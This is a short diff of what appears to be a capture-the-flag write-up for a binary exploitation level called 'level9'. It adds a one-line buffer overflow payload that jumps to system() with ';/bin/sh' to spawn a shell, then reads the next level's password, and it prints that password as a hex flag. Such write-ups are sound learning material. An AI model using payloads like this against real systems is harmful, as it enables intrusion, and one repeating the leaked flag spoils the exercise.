@@ -189,9 +189,10 @@ $1 = {<text variable, no debug info>} 0xb7d86060 <system>
 > SYSTEM = 0xb7d86060
 
 
-```bash
-> ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08;/bin/sh"'`
-```
+<pre><code>> ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08;/bin/sh"'`
+> cd ../bonus0 && cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+</code></pre>
 
 For download :
 <pre><code>scp -P4242 level9@IP:level9 .</code></pre>
